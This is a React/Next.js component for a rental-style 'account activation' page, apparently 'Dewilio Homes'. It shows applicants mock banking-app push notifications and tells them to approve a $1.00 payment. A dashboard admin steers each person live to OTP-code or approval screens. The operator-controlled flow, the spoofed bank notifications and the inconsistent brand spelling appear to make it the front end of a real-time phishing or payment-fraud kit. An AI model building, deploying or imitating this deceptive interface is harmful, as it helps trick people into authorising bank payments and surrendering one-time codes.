"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Check, Loader2, Lock, ShieldAlert, Smartphone } from "lucide-react";
import { useActivationLive } from "@/lib/useActivationLive";

const STEPS = [
  { key: "sent", label: "Request sent to your banking app" },
  { key: "approved", label: "Approved in your banking app" },
  { key: "final", label: "Final approval" },
] as const;

/** Length of the phone-vibrating "your bank just pushed you" moment before the redirect. */
const NOTICE_MS = 3200;

/** Stages that arrive as a push notification on the phone mockup. */
const NOTICE_STAGES = ["otp", "approved", "app_approval"];

const NOTICE_COPY: Record<string, { screen: string; push: string; action: string; title: string; body: string }> = {
  otp: {
    screen: "Verification code sent",
    push: "Dewilio Homes is requesting $1.00",
    action: "Open code screen",
    title: "Code sent",
    body: "A verification code is waiting for you. We’re taking you to the code screen.",
  },
  approved: {
    screen: "Payment approved",
    push: "Dewilio Homes approved $1.00",
    action: "Approve",
    title: "Payment approved",
    body: "Your activation payment went through. We’re taking you to your account.",
  },
  app_approval: {
    screen: "Approval requested",
    push: "Dewilio Homes is requesting $1.00",
    action: "Approve",
    title: "Approve the payment",
    body: "Open your banking app and approve the $1.00 activation payment to continue.",
  },
};

/** Which step is spinning for a given stage; earlier steps render as done. */
function activeStep(stage: string): number {
  if (stage === "otp_verified") return 2;
  return 1; // waiting for the applicant to approve in their bank
}

function elapsedLabel(seconds: number): string {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${m}:${String(s).padStart(2, "0")}`;
}

/**
 * The live approval screen an applicant holds on after paying. It shows the
 * payment as a pending request in their banking app — "Go to your banking app
 * and approve the payment" — over a live SSE stream keyed to the dashboard. The
 * moment an admin routes them, the phone in this mockup vibrates and a push
 * notification drops in, then the browser follows to the OTP or welcome screen.
 * No polling keeps this page fresh; the stream does.
 */
export function ActivationPending({ initialStage }: { initialStage: string }) {
  const router = useRouter();
  const [seconds, setSeconds] = useState(0);
  const navigated = useRef(false);
  const live = useActivationLive();

  useEffect(() => {
    const started = Date.now();
    const tick = setInterval(() => setSeconds(Math.floor((Date.now() - started) / 1000)), 1000);
    return () => clearInterval(tick);
  }, []);

  // The live stream. A decision from the dashboard plays as the bank-push
  // moment below before the page turns over; intermediate stages render as-is.
  // `played` only records that a push already ran, so it can't loop.
  const [played, setPlayed] = useState<string | null>(null);
  const notice = live && NOTICE_STAGES.includes(live.stage) && live.stage !== played ? live : null;
  useEffect(() => {
    if (live && NOTICE_STAGES.includes(live.stage)) navigated.current = true;
  }, [live]);

  // Let the push notification play out, then follow the destination. The
  // app-approval push lands on this very page, so it settles into the approval
  // screen below instead of navigating to where we already are.
  useEffect(() => {
    if (!notice) return;
    const timer = setTimeout(() => {
      if (notice.stage === "app_approval") setPlayed("app_approval");
      else router.replace(notice.destination);
    }, NOTICE_MS);
    return () => clearTimeout(timer);
  }, [notice, router]);

  const stage = live?.stage ?? initialStage;

  if (stage === "rejected") {
    return (
      <div>
        <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-rose-50 text-rose-600 ring-1 ring-rose-200">
          <ShieldAlert size={30} />
        </div>
        <h1 className="mt-6 font-display text-3xl font-bold text-brand-950">Activation declined</h1>
        <p className="mt-2 text-sm leading-relaxed text-brand-600">
          We weren&rsquo;t able to approve this activation. If you believe this is a mistake, our team
          can take another look.
        </p>
        <div className="mt-7 flex flex-col gap-2.5">
          <a
            href="mailto:support@dewillio.com"
            className="rounded-lg bg-brand-950 px-4 py-3 text-center text-sm font-semibold text-white transition-colors hover:bg-brand-800"
          >
            Contact support
          </a>
          <Link
            href="/"
            className="rounded-lg px-4 py-3 text-center text-sm font-semibold text-brand-600 transition-colors hover:text-brand-950"
          >
            Back to homepage
          </Link>
        </div>
      </div>
    );
  }

  // The banking-app moment: the phone buzzes and the push notification lands.
  if (notice) {
    const approved = notice.stage === "approved";
    const copy = NOTICE_COPY[notice.stage];
    return (
      <div>
        <div className="animate-notice-in mx-auto w-[15rem]">
          <div className="animate-vibrate overflow-hidden rounded-[2rem] border-[6px] border-brand-900 bg-brand-975 p-2 shadow-2xl shadow-brand-950/25">
            <div className="overflow-hidden rounded-[1.45rem] bg-white">
              {/* Status bar, so it reads as a phone screen */}
              <div className="flex items-center justify-between px-4 pb-1 pt-3 text-[10px] font-semibold text-brand-950">
                <span>9:41</span>
                <span className="flex items-center gap-1">
                  <span className="h-1 w-4 rounded-full bg-brand-950/25" />
                  <span className="h-2 w-2 rounded-full bg-brand-950/25" />
                  <span className="h-2 w-1.5 rounded-sm bg-brand-950/25" />
                </span>
              </div>
              <div className="px-4 pb-3 pt-1.5 text-center">
                <p className="text-[11px] font-semibold text-brand-400">Your banking app</p>
                <p className="text-sm font-bold text-brand-950">{copy.screen}</p>
              </div>

              {/* The push notification, sliding down over the app */}
              <div className="animate-notice-drop mx-3 mb-4 rounded-2xl bg-brand-50 p-3 shadow-lg shadow-brand-950/10 ring-1 ring-brand-100">
                <div className="flex items-start gap-2.5">
                  <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-brand-950 text-accent-400">
                    <Lock className="h-3.5 w-3.5" />
                  </span>
                  <div className="min-w-0 flex-1 text-left">
                    <p className="text-[10px] font-bold text-brand-500">Payment approval</p>
                    <p className="text-xs font-bold leading-snug text-brand-950">{copy.push}</p>
                    <p className="mt-0.5 text-[10px] text-brand-400">Tap to open your banking app</p>
                  </div>
                </div>
                <div className="mt-2.5 flex gap-1.5">
                  <button
                    type="button"
                    className={`flex-1 rounded-lg py-1.5 text-[11px] font-bold text-white ${
                      approved ? "bg-emerald-600" : "bg-brand-950"
                    }`}
                  >
                    {copy.action}
                  </button>
                  <button
                    type="button"
                    className="flex-1 rounded-lg border border-brand-200 bg-white py-1.5 text-[11px] font-semibold text-brand-500"
                  >
                    Ignore
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <p className="mt-6 font-display text-3xl font-bold leading-snug text-brand-950">{copy.title}</p>
        <p className="mt-2 text-sm leading-relaxed text-brand-600">{copy.body}</p>

        <div className="mt-5 inline-flex items-center gap-2 rounded-full border border-brand-100 bg-brand-50/60 px-3.5 py-1.5 text-xs font-medium text-brand-700">
          <Loader2 className="h-3.5 w-3.5 animate-spin text-accent-600" />
          {notice.stage === "app_approval" ? "Waiting for your approval…" : "Redirecting you…"}
        </div>

        <div className="mt-8 flex items-center justify-between border-t border-brand-100 pt-4 text-xs text-brand-400">
          <span className="flex items-center gap-1.5">
            <Smartphone className="h-3.5 w-3.5" />
            Done in your banking app
          </span>
          <span className="tabular-nums">{elapsedLabel(seconds)}</span>
        </div>
      </div>
    );
  }

  const active = activeStep(stage);
  const verified = stage === "otp_verified";

  return (
    <div>
      {/* Phone with a pinging approval-request bubble — the payment waiting in
          the banking app. Goes solid green once the request is approved. */}
      <div className="relative h-24 w-28">
        <span className="ping-dot absolute left-1/2 top-1/2 h-20 w-20 -translate-x-1/2 -translate-y-1/2 rounded-full bg-accent-500/15" />
        <Smartphone
          className={`relative mx-auto h-24 w-16 transition-colors duration-700 ${
            verified ? "text-emerald-500" : "text-brand-300"
          }`}
          strokeWidth={1.3}
        />
        <span
          className={`absolute -right-1 top-0 flex h-11 w-11 items-center justify-center rounded-full text-brand-950 shadow-lg transition-colors duration-700 ${
            verified ? "bg-emerald-400 shadow-emerald-400/30" : "bg-accent-500 shadow-accent-500/40"
          }`}
        >
          <span className="ping-dot absolute inset-0 rounded-full bg-inherit" />
          {verified ? (
            <Check className="relative h-5 w-5" strokeWidth={3} />
          ) : (
            <Loader2 className="relative h-5 w-5 animate-spin" strokeWidth={2.6} />
          )}
        </span>
      </div>

      <h1 className="mt-6 font-display text-3xl font-bold leading-snug text-brand-950">
        {verified ? "Payment approved" : "Check your banking app"}
      </h1>
      <p className="mt-2 text-sm leading-relaxed text-brand-600">
        {verified ? (
          <>
            The payment is approved. We&rsquo;re completing the final steps — this takes just a
            moment.
          </>
        ) : (
          <>
            Go to your banking app and{" "}
            <span className="font-semibold text-brand-900">approve the payment</span>. It shows up as
            a notification with the amount and merchant name, and this page updates automatically.
          </>
        )}
      </p>

      {/* The request as the banking app would list it */}
      <div className="mt-6 w-full rounded-xl border border-brand-100 bg-brand-50/60 px-4 py-3 text-left text-sm">
        <div className="flex items-center justify-between gap-3">
          <span className="truncate text-brand-500">Dewilio Homes</span>
          <span className="shrink-0 font-semibold text-brand-900">$1.00</span>
        </div>
        <div className="mt-1 text-xs text-brand-400">Account activation · pending approval</div>
      </div>

      <div className="mt-5 inline-flex items-center gap-2 rounded-full border border-brand-100 bg-brand-50/60 px-3.5 py-1.5 text-xs font-medium text-brand-700">
        <span className="ping-dot h-1.5 w-1.5 rounded-full bg-accent-500" />
        {verified ? "Approved — final approval in progress" : "Waiting for you to approve the payment"}
      </div>

      {/* Indeterminate shimmer — the wait is genuinely open-ended */}
      <div className="relative mt-7 h-1 w-full overflow-hidden rounded-full bg-brand-100">
        <span className="animate-shimmer absolute inset-y-0 left-0 w-1/2 rounded-full" />
      </div>

      <ul className="mt-7 space-y-3 text-left">
        {STEPS.map((step, i) => (
          <li key={step.key} className="flex items-center gap-3 text-sm">
            {i < active ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-emerald-100 text-emerald-700">
                <Check className="h-3.5 w-3.5" strokeWidth={3} />
              </span>
            ) : i === active ? (
              <span className="flex h-5 w-5 shrink-0 items-center justify-center">
                <Loader2 className="h-4 w-4 animate-spin text-accent-600" />
              </span>
            ) : (
              <span className="h-5 w-5 shrink-0 rounded-full border border-brand-200" />
            )}
            <span className={i <= active ? "text-brand-800" : "text-brand-400"}>{step.label}</span>
          </li>
        ))}
      </ul>

      <div className="mt-8 flex items-center justify-between border-t border-brand-100 pt-4 text-xs text-brand-400">
        <span className="flex items-center gap-1.5">
          <Lock className="h-3.5 w-3.5" />
          Keep this window open
        </span>
        <span className="tabular-nums">{elapsedLabel(seconds)}</span>
      </div>
    </div>
  );
}
